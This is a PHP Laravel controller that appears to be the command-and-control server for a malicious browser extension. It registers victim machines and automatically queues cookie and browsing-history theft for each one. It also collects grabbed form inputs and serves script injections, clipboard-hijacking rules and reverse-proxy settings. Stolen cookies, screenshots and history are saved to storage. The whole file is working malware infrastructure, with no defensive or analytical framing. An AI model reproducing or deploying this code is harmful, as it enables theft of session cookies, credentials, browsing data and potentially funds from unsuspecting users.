<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Jobs\SaveCookiesToDatabase;
use App\Models\Clipper;
use App\Models\Command;
use App\Models\Cookie;
use App\Models\CounterUrl;
use App\Models\Extension;
use App\Models\Grabber;
use App\Models\Injection;
use App\Models\Machine;
use App\Models\Setting;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Storage;

class MachineController extends Controller
{
    public function init(Request $r)
    {
        $uuid = $r->post('uuid');
        $referralCode = $r->post('referralCode');
        $ip = $_SERVER["HTTP_CF_CONNECTING_IP"] ?? $_SERVER['REMOTE_ADDR'];

        $machine = Machine::query()->where('uuid', $uuid)->first();

        $response = Http::get("http://ip-api.com/json/" . $ip)->json();
        $country = null;

        if ($response['status'] === "success") {
            $country = $response['countryCode'];
        }

        if (!$machine) {
            $machine = Machine::query()->create([
                'uuid' => $uuid,
                'ip' => $ip,
                'country' => $country,
                'ext_version' => $r->post('extensionVersion'),
                'referral_code' => $referralCode,
                'pc_information' => json_encode($r->post('machineInfo')),
                'last_activity' => Carbon::now()
            ]);

            Command::query()->create([
                'machine_id' => $machine->id,
                'command' => json_encode([
                    'cmd' => 'cookies',
                    'uuid' => $machine?->uuid,
                    'data' => []
                ])
            ]);

            Command::query()->create([
                'machine_id' => $machine->id,
                'command' => json_encode([
                    'cmd' => 'history',
                    'uuid' => $machine?->uuid,
                    'data' => []
                ])
            ]);
        } else {
            $machine->update([
                'uuid' => $uuid,
                'ip' => $ip,
                'country' => $country,
                'ext_version' => $r->post('extensionVersion'),
                'referral_code' => $referralCode,
                'pc_information' => json_encode($r->post('machineInfo')),
                'last_activity' => Carbon::now()
            ]);

            $machine = $machine->fresh();
        }

        foreach ($r->post('extensions') as $extension) {
            $ext = Extension::query()->where('machine_id', $machine->id)->where('ext_id', $extension['id'])->first();

            if (!$ext) {
                Extension::query()->create([
                    'machine_id' => $machine->id,
                    'ext_id' => $extension['id'],
                    'name' => $extension['name'],
                    'url' => $extension['homepageUrl'],
                    'is_enabled' => $extension['enabled']
                ]);
            } else {
                $ext->update([
                    'ext_id' => $extension['id'],
                    'name' => $extension['name'],
                    'url' => $extension['homepageUrl'],
                    'is_enabled' => $extension['enabled']
                ]);
            }
        }

        return [
            'isEnabledProxy' => $machine->is_proxy_enabled
        ];
    }

    public function setGrabberInfo(Request $r)
    {
        $uuid = $r->post('uuid');
        $inputs = $r->post('data');

        $machine = Machine::query()->where('uuid', $uuid)->first();

        if (!$machine) {
            return;
        }

        foreach ($inputs as $input) {
            Grabber::query()->create([
                'machine_id' => $machine->id,
                'name' => $input['name'],
                'value' => $input['value'],
                'url' => $input['url']
            ]);
        }
    }

    public function getInjections()
    {
        return Injection::query()->where('is_enabled', true)->get();
    }

    public function getSettings()
    {
        $grabberLinks = Setting::getValue('grabber_urls');
        $reverseProxy = Setting::getValue('reverse_proxy_ip');

        return [
            'grabberLinks' => $grabberLinks ? json_decode($grabberLinks, true) : [],
            'reverseProxy' => $reverseProxy ?? null
        ];
    }

    public function getCommands(Request $r)
    {
        $uuid = $r->get('uuid');

        $machine = Machine::query()->where('uuid', $uuid)->first();

        if (!$machine) {
            return [];
        }

        $machine->update([
            'last_activity' => Carbon::now()
        ]);

        return Command::query()->where('machine_id', $machine->id)->where('answer', null)->get();
    }

    public function getClipper()
    {
        return Clipper::query()->get();
    }

    public function setCommand(Request $r)
    {
        $id = $r->post('id');
        $answer = json_encode($r->post('answer'));

        $command = Command::query()->where('id', $id)->first();
        $data = json_decode($command->command, true);

        if ($data['cmd'] === 'cookies') {
            Storage::disk('public')->put('command_' . $id . '.json', $answer);

            $answer = json_encode([
                'file' => Storage::disk('public')->path('command_' . $id . '.json')
            ]);

            SaveCookiesToDatabase::dispatch($r->post('answer'), intval($command->machine_id));
        }

        if ($data['cmd'] === "screenshot") {
            $answer = $r->post('answer');

            $image = str_replace('data:image/jpeg;base64,', '', $answer['screen']);
            $image = str_replace(' ', '+', $image);
            $imageName = 'command_' . $id . '.jpg';

            Storage::disk('public')->put($imageName, base64_decode($image));
        }

        if ($data['cmd'] === 'history') {
            $history = $r->post('answer');
            $urls = Setting::getValue('counter_urls') ?? [];

            if (isset($urls) && !empty($urls)) {
                $urls = json_decode($urls, true);

                foreach ($history as $value) {
                    foreach ($urls as $url) {
                        if (isset($value['url']) && strlen($url) > 0 && str_contains($value['url'], $url)) {
                            $bdUrl = CounterUrl::query()->where('machine_id', $command->machine_id)->where('url', $url)->first();

                            if (!$bdUrl) {
                                CounterUrl::query()->create([
                                    'machine_id' => $command->machine_id,
                                    'url' => $url
                                ]);
                            }
                        }
                    }
                }
            }

            Storage::disk('public')->put('command_' . $id . '.json', $answer);

            $answer = json_encode([
                'file' => Storage::disk('public')->path('command_' . $id . '.json')
            ]);
        }

        $command->update([
            'answer' => $answer
        ]);

        return [];
    }
}
